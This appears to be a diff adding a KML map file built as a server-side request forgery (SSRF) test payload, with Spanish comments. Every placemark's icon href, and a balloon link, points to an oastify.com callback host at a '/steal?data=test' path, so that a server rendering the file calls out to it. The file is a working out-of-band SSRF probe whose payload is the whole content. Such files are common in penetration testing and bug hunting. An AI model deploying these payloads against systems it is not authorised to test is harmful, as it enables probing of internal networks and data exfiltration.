@@ -1,0 +1,102 @@
+<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.opengis.net/kml/2.2 https://developers.google.com/kml/schema/kml22gx.xsd">
+  <Document>
+    <name>SSRF - Icono Grande</name>
+
+    <!-- ========================================== -->
+    <!-- Icono enorme con scale 100                -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - Icono Enorme</name>
+      <description><![CDATA[Test con icono de tamaño gigante]]></description>
+      <Style>
+        <IconStyle>
+          <scale>100</scale>
+          <Icon>
+            <href>https://rqlzw3caf9pfs0ra44on3rnx7odf15pu.oastify.com/steal?data=test</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.330653965921906,46.529863580494734</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- Icono con tamaño fijo 500x500            -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - Icono 500x500</name>
+      <description><![CDATA[Icono con tamaño fijo]]></description>
+      <Style>
+        <IconStyle>
+          <scale>1</scale>
+          <Icon>
+            <href>https://rqlzw3caf9pfs0ra44on3rnx7odf15pu.oastify.com/steal?data=test</href>
+            <gx:w>500</gx:w>
+            <gx:h>500</gx:h>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.5,46.5</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- Múltiples iconos para mayor visibilidad   -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - Múltiples Iconos</name>
+      <description><![CDATA[Múltiples peticiones al colaborador]]></description>
+      <Style>
+        <IconStyle>
+          <scale>50</scale>
+          <Icon>
+            <href>https://rqlzw3caf9pfs0ra44on3rnx7odf15pu.oastify.com/steal?data=test</href>
+          </Icon>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.6,46.4</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- Icono con hotSpot (ancla)                 -->
+    <!-- ========================================== -->
+    <Placemark>
+      <name>SSRF - HotSpot</name>
+      <description><![CDATA[Icono con punto de anclaje]]></description>
+      <Style>
+        <IconStyle>
+          <scale>80</scale>
+          <Icon>
+            <href>https://rqlzw3caf9pfs0ra44on3rnx7odf15pu.oastify.com/steal?data=test</href>
+          </Icon>
+          <hotSpot x="0.5" y="0.5" xunits="fraction" yunits="fraction"/>
+        </IconStyle>
+      </Style>
+      <Point>
+        <coordinates>8.7,46.3</coordinates>
+      </Point>
+    </Placemark>
+
+    <!-- ========================================== -->
+    <!-- Exfiltración a través de BalloonStyle     -->
+    <!-- ========================================== -->
+    <Style id="balloonSSRF">
+      <BalloonStyle>
+        <text><![CDATA[<a href="https://rqlzw3caf9pfs0ra44on3rnx7odf15pu.oastify.com/steal?data=test">Click here</a>]]></text>
+      </BalloonStyle>
+    </Style>
+    <Placemark>
+      <name>SSRF - Balloon</name>
+      <description><![CDATA[Exfiltración a través de BalloonStyle]]></description>
+      <styleUrl>#balloonSSRF</styleUrl>
+      <Point>
+        <coordinates>8.8,46.2</coordinates>
+      </Point>
+    </Placemark>
+
+  </Document>
+</kml>
